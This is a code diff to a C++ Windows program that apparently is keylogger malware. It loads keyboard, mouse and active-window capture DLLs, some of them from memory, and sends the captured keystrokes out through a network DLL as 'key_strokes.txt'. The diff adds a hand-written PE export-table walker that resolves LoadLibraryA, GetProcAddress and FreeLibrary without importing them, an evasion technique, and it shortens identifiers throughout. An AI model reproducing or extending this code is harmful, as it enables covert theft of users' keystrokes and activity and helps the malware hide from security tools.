@@ -30,6 +30,15 @@ HINSTANCE hDLL_n;
 
 //------------------------------------------------------------------------------------------------------------------------------
 
+typedef HMODULE(WINAPI *LoadLibraryAFn)(LPCSTR);
+LoadLibraryAFn MyLoadLibraryA;
+
+typedef FARPROC(WINAPI *CustomGetProcAddress)(HMODULE, LPCSTR);
+CustomGetProcAddress myGetProcAddress;
+
+typedef HMODULE(WINAPI *FreeLibraryFn)(HMODULE);
+FreeLibraryFn MyFreeLibrary;
+
 typedef int (*SendDataFunc)(const std::string&, const std::string&);
 typedef std::string (*RecvDataFunc)(const std::string&);
 typedef std::vector<unsigned char> (*RecvDataRawFunc)(const std::string&);
@@ -41,8 +50,8 @@ RecvDataRawFunc receive_data_raw;
 
 typedef void(*InitializeFunc)(std::vector<std::string>*);
 typedef void(*CleanupFunc)();
-InitializeFunc initialize_active_window, initialize_mouse, initialize_keyboard;
-CleanupFunc cleanup_active_window, cleanup_mouse, cleanup_keyboard;
+InitializeFunc init_active_window, init_mouse, init_keyboard;
+CleanupFunc cleanup_aw, cleanup_m, cleanup_kb;
 
 //------------------------------------------------------------------------------------------------------------------------------
 
@@ -53,15 +62,22 @@ std::vector<std::string> shared_vector;
 
 int load_dlls();
 BOOL CtrlHandler(DWORD fdwCtrlType);
+void* FindExportAddress(HMODULE hModule, const char* funcName);
 
 /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
 int main(int argc, char* argv[])
 {
+
+    HMODULE hKernel32 = (HMODULE)GetModuleHandleA("kernel32.dll");
+
+    MyLoadLibraryA = (LoadLibraryAFn)FindExportAddress(hKernel32, "LoadLibraryA");
+    myGetProcAddress = (CustomGetProcAddress)FindExportAddress(hKernel32, "GetProcAddress");
+    MyFreeLibrary = (FreeLibraryFn)FindExportAddress(hKernel32, "FreeLibrary");
+
     std::atomic<bool> receivedTerminationSignal(false);
     
     if (load_dlls() != 0)return 1;
-    //cout << "DLL loaded successfully.\n";
 
     // Set the console control handler
     if (!SetConsoleCtrlHandler(CtrlHandler, TRUE))
@@ -70,11 +86,9 @@ int main(int argc, char* argv[])
         return 1;
     }
 
-
-    initialize_active_window(&shared_vector);
-    initialize_keyboard(&shared_vector);
-    initialize_mouse(&shared_vector);
-
+    init_active_window(&shared_vector);
+    init_keyboard(&shared_vector);
+    init_mouse(&shared_vector);
 
     std::thread terminationCheckThread([&]()
     {
@@ -90,9 +104,9 @@ int main(int argc, char* argv[])
                 for (const auto& entry : shared_vector) oss << entry;
                 send_data("key_strokes.txt",oss.str());
 
-                cleanup_keyboard();
-                cleanup_mouse();
-                cleanup_active_window();
+                cleanup_kb();
+                cleanup_m();
+                cleanup_aw();
                 break; 
             }
             std::this_thread::sleep_for(std::chrono::milliseconds(100)); 
@@ -112,7 +126,7 @@ int main(int argc, char* argv[])
 
     terminationCheckThread.join();
 
-    FreeLibrary(hDLL_n);
+    MyFreeLibrary(hDLL_n);
     MemoryFreeLibrary(hDLL_k);
     MemoryFreeLibrary(hDLL_m);
     MemoryFreeLibrary(hDLL_w);
@@ -120,18 +134,49 @@ int main(int argc, char* argv[])
     return 0;
 }
 
+void* FindExportAddress(HMODULE hModule, const char* funcName)
+{
+    // Access the PE headers of the loaded module
+    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)hModule;
+    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)((BYTE*)hModule + dosHeader->e_lfanew);
+
+    // Get the export directory
+    IMAGE_EXPORT_DIRECTORY* exportDir = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)hModule + ntHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
+
+    // Get the list of function names and addresses
+    DWORD* nameRVAs = (DWORD*)((BYTE*)hModule + exportDir->AddressOfNames);
+    WORD* ordRVAs = (WORD*)((BYTE*)hModule + exportDir->AddressOfNameOrdinals);
+    DWORD* funcRVAs = (DWORD*)((BYTE*)hModule + exportDir->AddressOfFunctions);
+
+    // Search through the list of function names
+    for (DWORD i = 0; i < exportDir->NumberOfNames; ++i)
+    {
+        char* funcNameFromExport = (char*)((BYTE*)hModule + nameRVAs[i]);
+//std::cout << "Checking " << funcNameFromExport << std::endl;
+        if (strcmp(funcNameFromExport, funcName) == 0)
+        {
+            DWORD funcRVA = funcRVAs[ordRVAs[i]];
+            return (void*)((BYTE*)hModule + funcRVA);
+
+        }
+    }
+    return nullptr;
+
+}
+
 int load_dlls()                                             // loads the dlls from the disk
 {
-    hDLL_n = LoadLibraryA(dllPath_n);
+
+    hDLL_n = MyLoadLibraryA(dllPath_n);
     if (hDLL_n == nullptr)
     {
         std::cerr << "Failed to load DLL: " << GetLastError() << std::endl;
         return EXIT_FAILURE;
     }
 
-    receive_data_raw = (RecvDataRawFunc)GetProcAddress(hDLL_n, "?receive_data_raw@@YA?AV?$vector@EV?$allocator@E@std@@@std@@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@@Z");
-    receive_data = (RecvDataFunc)GetProcAddress(hDLL_n, "?receive_data@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEBV12@@Z");
-    send_data = (SendDataFunc)GetProcAddress(hDLL_n, "?send_data@@YAHAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z");
+    receive_data_raw = (RecvDataRawFunc)myGetProcAddress(hDLL_n, "?receive_data_raw@@YA?AV?$vector@EV?$allocator@E@std@@@std@@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@@Z");
+    receive_data = (RecvDataFunc)myGetProcAddress(hDLL_n, "?receive_data@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEBV12@@Z");
+    send_data = (SendDataFunc)myGetProcAddress(hDLL_n, "?send_data@@YAHAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z");
     if (!receive_data || !send_data || !receive_data_raw)
     {
         std::cerr << "Failed to get one or more function addresses for network dll.\n";
@@ -156,9 +201,9 @@ int load_dlls()                                             // loads the dlls fr
         return 1;
     }
 
-    initialize_keyboard = (InitializeFunc)MemoryGetProcAddress(hDLL_k, "?Initialize@@YAXPEAV?$vector@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V?$allocator@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@std@@@Z");
-    cleanup_keyboard = (CleanupFunc)MemoryGetProcAddress(hDLL_k, "?Cleanup@@YAXXZ");
-    if (!initialize_keyboard || !cleanup_keyboard)
+    init_keyboard = (InitializeFunc)MemoryGetProcAddress(hDLL_k, "?Initialize@@YAXPEAV?$vector@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V?$allocator@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@std@@@Z");
+    cleanup_kb = (CleanupFunc)MemoryGetProcAddress(hDLL_k, "?Cleanup@@YAXXZ");
+    if (!init_keyboard || !cleanup_kb)
     {
         std::cerr << "Failed to get one or more function addresses for keyboard dll.\n";
         MemoryFreeLibrary(hDLL_k);
@@ -174,9 +219,9 @@ int load_dlls()                                             // loads the dlls fr
         return 1;
     }
 
-    initialize_mouse = (InitializeFunc)MemoryGetProcAddress(hDLL_m, "?Initialize@@YAXPEAV?$vector@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V?$allocator@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@std@@@Z");
-    cleanup_mouse = (CleanupFunc)MemoryGetProcAddress(hDLL_m, "?Cleanup@@YAXXZ");
-    if (!initialize_mouse || !cleanup_mouse)
+    init_mouse = (InitializeFunc)MemoryGetProcAddress(hDLL_m, "?Initialize@@YAXPEAV?$vector@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V?$allocator@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@std@@@Z");
+    cleanup_m = (CleanupFunc)MemoryGetProcAddress(hDLL_m, "?Cleanup@@YAXXZ");
+    if (!init_mouse || !cleanup_m)
     {
         std::cerr << "Failed to get one or more function addresses for mouse dll.\n";
         MemoryFreeLibrary(hDLL_m);
@@ -192,11 +237,11 @@ int load_dlls()                                             // loads the dlls fr
         return 1;
     }
 
-    initialize_active_window = (InitializeFunc)MemoryGetProcAddress(hDLL_w, "?Initialize@@YAXPEAV?$vector@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V?$allocator@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@std@@@Z");
-    cleanup_active_window = (CleanupFunc)MemoryGetProcAddress(hDLL_w, "?Cleanup@@YAXXZ");
-    if (!initialize_active_window || !cleanup_active_window)
+    init_active_window = (InitializeFunc)MemoryGetProcAddress(hDLL_w, "?Initialize@@YAXPEAV?$vector@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V?$allocator@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@std@@@Z");
+    cleanup_aw = (CleanupFunc)MemoryGetProcAddress(hDLL_w, "?Cleanup@@YAXXZ");
+    if (!init_active_window || !cleanup_aw)
     {
-        std::cerr << "Failed to get one or more function addresses for initialize_active_window dll.\n";
+        std::cerr << "Failed to get one or more function addresses for init_active_window dll.\n";
         MemoryFreeLibrary(hDLL_w);
         return 1;
     }
@@ -218,12 +263,11 @@ BOOL CtrlHandler(DWORD fdwCtrlType)
             
             running = false;
             
-            cleanup_keyboard();
-            cleanup_mouse();
-            cleanup_active_window();
+            cleanup_kb();
+            cleanup_m();
+            cleanup_aw();
 
-            FreeLibrary(hDLL_n);
-
+            MyFreeLibrary(hDLL_n);
             MemoryFreeLibrary(hDLL_k);
             MemoryFreeLibrary(hDLL_m);
             MemoryFreeLibrary(hDLL_w);
